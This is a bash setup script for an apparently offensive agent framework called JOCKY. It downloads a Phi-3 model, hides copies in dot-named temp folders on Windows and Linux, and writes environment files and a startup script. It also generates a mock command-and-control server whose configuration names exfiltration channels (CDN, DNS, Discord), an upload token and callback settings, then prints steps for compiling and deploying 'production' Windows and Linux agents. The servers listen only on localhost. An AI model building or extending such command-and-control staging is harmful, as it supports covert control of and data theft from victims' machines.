#!/bin/bash

###############################################################################
# JOCKY Production Environment Setup Script
# Downloads Phi-3 ML model and configures environment for VM/container access
# Supports both Windows (via WSL/container) and Linux targets
###############################################################################

set -e

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
JOCKY_ROOT="${SCRIPT_DIR}"

# Model configuration
MODEL_NAME="phi-3-mini-4k-instruct-gguf"
MODEL_FILENAME="phi-3-mini-4k-instruct-q4_k_m.gguf"
MODEL_URL="https://huggingface.co/bartowski/phi-3-mini-4k-instruct-gguf/resolve/main/phi-3-mini-4k-instruct-q4_k_m.gguf"
MODEL_SIZE="2.3GB"

# Target directories for Windows and Linux
WINDOWS_MODEL_DIR="C:\\Windows\\Temp\\.jocky_model"
LINUX_MODEL_DIR="/tmp/.jocky_model"
WINDOWS_MODEL_SHARED="/mnt/c/Windows/Temp/.jocky_model"  # If running on WSL
LINUX_MODEL_SHARED="/tmp/.jocky_model"

# Local model storage
LOCAL_MODEL_DIR="${JOCKY_ROOT}/models"
LOCAL_MODEL_PATH="${LOCAL_MODEL_DIR}/${MODEL_FILENAME}"

# C2 Configuration
C2_PORT=8443
C2_MODEL_PORT=9000

# Function to print colored output
print_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to download model
download_model() {
    print_info "Downloading Phi-3 Model (~${MODEL_SIZE})"
    print_info "Source: ${MODEL_URL}"

    # Create local model directory
    mkdir -p "${LOCAL_MODEL_DIR}"

    # Check if model already exists
    if [ -f "${LOCAL_MODEL_PATH}" ]; then
        print_success "Model already downloaded at: ${LOCAL_MODEL_PATH}"
        print_info "File size: $(du -h "${LOCAL_MODEL_PATH}" | cut -f1)"
        return 0
    fi

    print_info "Downloading to: ${LOCAL_MODEL_PATH}"
    print_warning "This may take 10-15 minutes depending on internet speed"

    # Try wget first, then curl
    if command_exists wget; then
        print_info "Using wget for download..."
        wget -O "${LOCAL_MODEL_PATH}" "${MODEL_URL}" || {
            print_error "wget download failed"
            return 1
        }
    elif command_exists curl; then
        print_info "Using curl for download..."
        curl -L -o "${LOCAL_MODEL_PATH}" "${MODEL_URL}" || {
            print_error "curl download failed"
            return 1
        }
    else
        print_error "Neither wget nor curl found. Please install one of them:"
        echo "  Ubuntu/Debian: sudo apt install wget curl"
        echo "  macOS: brew install wget curl"
        echo "  Fedora: sudo dnf install wget curl"
        return 1
    fi

    print_success "Model downloaded successfully"
    print_info "File size: $(du -h "${LOCAL_MODEL_PATH}" | cut -f1)"

    return 0
}

# Function to setup Windows environment
setup_windows_environment() {
    print_info "Setting up Windows environment..."

    # Check if running on WSL
    if grep -qi microsoft /proc/version 2>/dev/null; then
        print_info "Detected WSL environment"

        # Copy model to Windows temp folder
        print_info "Copying model to Windows Temp folder..."
        mkdir -p "${WINDOWS_MODEL_SHARED}"
        cp "${LOCAL_MODEL_PATH}" "${WINDOWS_MODEL_SHARED}/" || {
            print_error "Failed to copy model to Windows"
            return 1
        }

        print_success "Model copied to: ${WINDOWS_MODEL_SHARED}/"
    fi

    # Export environment variables for Windows
    print_info "Setting environment variables for Windows deployment..."

    cat > "${JOCKY_ROOT}/.env.windows" << 'EOF'
# JOCKY Windows Production Environment
export JOCKY_C2_PRIMARY="http://localhost:8443/api/config"
export JOCKY_C2_FALLBACK="http://127.0.0.1:8443/api/config"
export JOCKY_MODEL_REPO="http://localhost:9000/models"
export JOCKY_MODEL_PATH="C:\Windows\Temp\.jocky_model\phi-3-mini-4k-instruct-q4_k_m.gguf"
export JOCKY_LOCAL_MODEL="/models/phi-3-mini-4k-instruct-q4_k_m.gguf"
export JOCKY_BUILD_ID="production_windows_v1"
export JOCKY_C2_LOCAL_PORT=8443
export JOCKY_MODEL_SERVER_PORT=9000
EOF

    print_success "Windows environment file created: ${JOCKY_ROOT}/.env.windows"

    return 0
}

# Function to setup Linux environment
setup_linux_environment() {
    print_info "Setting up Linux environment..."

    # Copy model to Linux temp folder
    print_info "Copying model to Linux /tmp folder..."
    mkdir -p "${LINUX_MODEL_SHARED}"
    cp "${LOCAL_MODEL_PATH}" "${LINUX_MODEL_SHARED}/" || {
        print_error "Failed to copy model to /tmp"
        return 1
    }

    print_success "Model copied to: ${LINUX_MODEL_SHARED}/"

    # Export environment variables for Linux
    print_info "Setting environment variables for Linux deployment..."

    cat > "${JOCKY_ROOT}/.env.linux" << 'EOF'
# JOCKY Linux Production Environment
export JOCKY_C2_PRIMARY="http://localhost:8443/api/config"
export JOCKY_C2_FALLBACK="http://127.0.0.1:8443/api/config"
export JOCKY_MODEL_REPO="http://localhost:9000/models"
export JOCKY_MODEL_PATH="/tmp/.jocky_model/phi-3-mini-4k-instruct-q4_k_m.gguf"
export JOCKY_LOCAL_MODEL="/tmp/.jocky_model/phi-3-mini-4k-instruct-q4_k_m.gguf"
export JOCKY_BUILD_ID="production_linux_v1"
export JOCKY_C2_LOCAL_PORT=8443
export JOCKY_MODEL_SERVER_PORT=9000
EOF

    print_success "Linux environment file created: ${JOCKY_ROOT}/.env.linux"

    return 0
}

# Function to setup mock C2 server
setup_c2_server() {
    print_info "Setting up mock C2 server..."

    mkdir -p "${JOCKY_ROOT}/c2_server"

    # Create simple Python C2 server
    cat > "${JOCKY_ROOT}/c2_server/server.py" << 'EOF'
#!/usr/bin/env python3
"""
Mock C2 Server for JOCKY Production Deployment
Responds to agent configuration requests
"""

import http.server
import json
from pathlib import Path

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/api/config':
            # Return C2 configuration
            config = {
                "cdn_endpoint": "http://localhost:9000/upload",
                "cdn_token": "Bearer_production_token_v1",
                "model_url": "http://localhost:9000/models/phi-3-mini-4k-instruct-q4_k_m.gguf",
                "model_hash": "sha256:placeholder",
                "exfil_channels": ["cdn", "dns", "discord"],
                "auto_update": True,
                "callback_interval": 3600
            }

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(config).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        print(f"[C2] {format % args}")

if __name__ == '__main__':
    server = http.server.HTTPServer(('localhost', 8443), C2Handler)
    print("[*] Mock C2 Server running on http://localhost:8443")
    print("[*] Serving configuration at /api/config")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("[*] C2 Server stopped")
EOF

    chmod +x "${JOCKY_ROOT}/c2_server/server.py"
    print_success "C2 server script created: ${JOCKY_ROOT}/c2_server/server.py"

    return 0
}

# Function to setup model server
setup_model_server() {
    print_info "Setting up model server..."

    mkdir -p "${JOCKY_ROOT}/model_server"

    # Create simple Python model server
    cat > "${JOCKY_ROOT}/model_server/server.py" << 'EOF'
#!/usr/bin/env python3
"""
Model Server for JOCKY Production Deployment
Serves ML model files to agents
"""

import http.server
import os
from pathlib import Path

class ModelHandler(http.server.BaseHTTPRequestHandler):
    MODEL_DIR = Path(__file__).parent.parent / "models"

    def do_GET(self):
        # Handle model download requests
        if self.path.startswith('/models/'):
            model_file = self.path.split('/')[-1]
            model_path = self.MODEL_DIR / model_file

            if model_path.exists():
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Length', str(model_path.stat().st_size))
                self.end_headers()

                with open(model_path, 'rb') as f:
                    self.wfile.write(f.read())

                print(f"[Model Server] Served {model_file}")
            else:
                self.send_response(404)
                self.end_headers()
                print(f"[Model Server] Model not found: {model_file}")
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        print(f"[Model Server] {format % args}")

if __name__ == '__main__':
    server = http.server.HTTPServer(('localhost', 9000), ModelHandler)
    print("[*] Model Server running on http://localhost:9000")
    print(f"[*] Serving models from: {ModelHandler.MODEL_DIR}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("[*] Model Server stopped")
EOF

    chmod +x "${JOCKY_ROOT}/model_server/server.py"
    print_success "Model server script created: ${JOCKY_ROOT}/model_server/server.py"

    return 0
}

# Function to create startup script
create_startup_script() {
    print_info "Creating startup script..."

    cat > "${JOCKY_ROOT}/start_production_environment.sh" << 'EOF'
#!/bin/bash
# Start JOCKY Production Environment (C2 + Model Server)

echo "[*] Starting JOCKY Production Environment..."

# Start C2 Server
echo "[*] Starting C2 Server on port 8443..."
python3 c2_server/server.py &
C2_PID=$!

# Start Model Server
echo "[*] Starting Model Server on port 9000..."
python3 model_server/server.py &
MODEL_PID=$!

echo "[+] Servers started:"
echo "    C2 Server (PID $C2_PID):    http://localhost:8443"
echo "    Model Server (PID $MODEL_PID): http://localhost:9000"
echo ""
echo "[*] Run agents with:"
echo "    source .env.windows  # for Windows"
echo "    source .env.linux    # for Linux"
echo ""
echo "[*] To stop servers: kill $C2_PID $MODEL_PID"

wait
EOF

    chmod +x "${JOCKY_ROOT}/start_production_environment.sh"
    print_success "Startup script created: ${JOCKY_ROOT}/start_production_environment.sh"

    return 0
}

# Function to display setup summary
display_summary() {
    echo ""
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║ JOCKY Production Environment Setup Complete               ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo ""

    print_success "Model downloaded and ready:"
    echo "    Path: ${LOCAL_MODEL_PATH}"
    echo "    Size: $(du -h "${LOCAL_MODEL_PATH}" | cut -f1)"
    echo ""

    print_success "Environment files created:"
    echo "    Windows: ${JOCKY_ROOT}/.env.windows"
    echo "    Linux:   ${JOCKY_ROOT}/.env.linux"
    echo ""

    print_success "Servers configured:"
    echo "    C2 Server:    http://localhost:8443"
    echo "    Model Server: http://localhost:9000"
    echo ""

    print_info "To start the production environment:"
    echo "    cd ${JOCKY_ROOT}"
    echo "    ./start_production_environment.sh"
    echo ""

    print_info "To deploy Windows agent:"
    echo "    source .env.windows"
    echo "    python3 scripts/compile_pipeline.py examples/production_windows_complete.jky build/prod --platform windows --preset standard"
    echo ""

    print_info "To deploy Linux agent:"
    echo "    source .env.linux"
    echo "    python3 scripts/compile_pipeline.py examples/production_linux_complete.jky build/prod --platform linux --preset standard"
    echo ""
}

# Main execution
main() {
    echo ""
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║ JOCKY Production Environment Setup                        ║"
    echo "║ Model Download + C2/Server Configuration                  ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo ""

    # Download model
    if ! download_model; then
        print_error "Failed to download model"
        exit 1
    fi

    # Setup environments
    if ! setup_windows_environment; then
        print_warning "Windows environment setup had issues (may not be critical)"
    fi

    if ! setup_linux_environment; then
        print_error "Failed to setup Linux environment"
        exit 1
    fi

    # Setup servers
    if ! setup_c2_server; then
        print_error "Failed to setup C2 server"
        exit 1
    fi

    if ! setup_model_server; then
        print_error "Failed to setup model server"
        exit 1
    fi

    # Create startup script
    if ! create_startup_script; then
        print_error "Failed to create startup script"
        exit 1
    fi

    # Display summary
    display_summary
}

# Run main
main "$@"
